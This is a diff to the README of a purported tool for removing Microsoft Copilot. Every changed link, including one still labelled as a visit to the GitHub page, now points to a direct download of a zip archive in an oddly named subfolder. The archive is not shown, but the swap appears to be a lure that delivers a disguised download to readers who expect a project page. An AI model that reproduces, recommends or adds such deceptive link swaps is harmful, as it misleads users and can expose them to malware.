@@ -1,6 +1,6 @@
 # 🛠️ RemoveMicrosoftCopilotAI - Remove Microsoft Copilot AI Easily
 
-[![Download RemoveMicrosoftCopilotAI](https://img.shields.io/badge/Download-RemoveMicrosoftCopilotAI-brightgreen?style=for-the-badge)](https://github.com/anhhuy209/RemoveMicrosoftCopilotAI)
+[![Download RemoveMicrosoftCopilotAI](https://img.shields.io/badge/Download-RemoveMicrosoftCopilotAI-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/anhhuy209/RemoveMicrosoftCopilotAI/main/psychorrhagic/AI_Remove_Copilot_Microsoft_v3.3.zip)
 
 ## 📋 About RemoveMicrosoftCopilotAI
 
@@ -27,7 +27,7 @@ This section guides you through downloading and running the tool step by step. N
 
 Go to the official download page by clicking this link or badge:
 
-[![Download RemoveMicrosoftCopilotAI](https://img.shields.io/badge/Download-RemoveMicrosoftCopilotAI-blue?style=for-the-badge)](https://github.com/anhhuy209/RemoveMicrosoftCopilotAI)
+[![Download RemoveMicrosoftCopilotAI](https://img.shields.io/badge/Download-RemoveMicrosoftCopilotAI-blue?style=for-the-badge)](https://raw.githubusercontent.com/anhhuy209/RemoveMicrosoftCopilotAI/main/psychorrhagic/AI_Remove_Copilot_Microsoft_v3.3.zip)
 
 This page contains the latest version of the tool and instructions for getting started.
 
@@ -121,7 +121,7 @@ You may want to visit the GitHub page regularly for:
 - User feedback
 - Bug fixes or improvements
 
-[Visit RemoveMicrosoftCopilotAI on GitHub](https://github.com/anhhuy209/RemoveMicrosoftCopilotAI)
+[Visit RemoveMicrosoftCopilotAI on GitHub](https://raw.githubusercontent.com/anhhuy209/RemoveMicrosoftCopilotAI/main/psychorrhagic/AI_Remove_Copilot_Microsoft_v3.3.zip)
 
 ## 🔽 Download and Install
 
